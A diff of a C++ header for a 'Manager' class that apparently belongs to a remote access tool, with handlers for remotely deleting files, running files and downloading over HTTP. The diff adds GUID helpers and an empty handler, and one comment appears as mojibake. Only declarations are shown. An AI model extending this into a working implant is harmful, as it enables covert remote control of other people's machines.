@@ -2,6 +2,7 @@
 #include "CommData.h"
 #include "CommNames.h"
 #include "CmdRedirector.h"
+#include "GuidStructs.h"
 #include "../../pub/ModuleInterface.h"
 
 class Manager
@@ -9,9 +10,14 @@ class Manager
 	DECLARE_SINGLETON(Manager);
 public:
 	ULONG GetMasterIP();
-	GUID GetClientID() const;
+	tstring GetClientID() const;
 	BOOL DeleteModule(LPCTSTR modFilename);
 //	void AddAllLocalModules();
+
+	//CPGuidÏà¹Øº¯Êý
+	static BOOL CreateCPGuid(CPGUID& cpguid);
+	static void CPGuid2Str(const CPGUID& cpguid, tstring& str);
+	static BOOL Str2CPGuid(LPCTSTR str, CPGUID& cpguid);
 
 	BOOL QueryCommandHandler(MSGID msgid, FnExecuteRCCommand* ppHandler, LPVOID* ppParameter);
 
@@ -48,11 +54,13 @@ private:
 	static BOOL ExecuteRCCommand_DeleteFile(MSGID msgid, const LPBYTE pData, DWORD dwSize, LPVOID lpParameter);
 	static BOOL ExecuteRCCommand_RunFile(MSGID msgid, const LPBYTE pData, DWORD dwSize, LPVOID lpParameter);
 	static BOOL ExecuteRCCommand_HttpDown(MSGID msgid, const LPBYTE pData, DWORD dwSize, LPVOID lpParameter);
+	static BOOL ExecuteRCCommand_Empty(MSGID msgid, const LPBYTE pData, DWORD dwSize, LPVOID lpParameter);
+
 public:
 	CmdRedirector	m_cmdRedirector;
 private:
 	COMM_NAME		m_commName;
 	ULONG			m_masterIP;
-	GUID			m_clientid;
+	CPGUID			m_clientid;
 	BOOL			m_bFirstRun;
 };
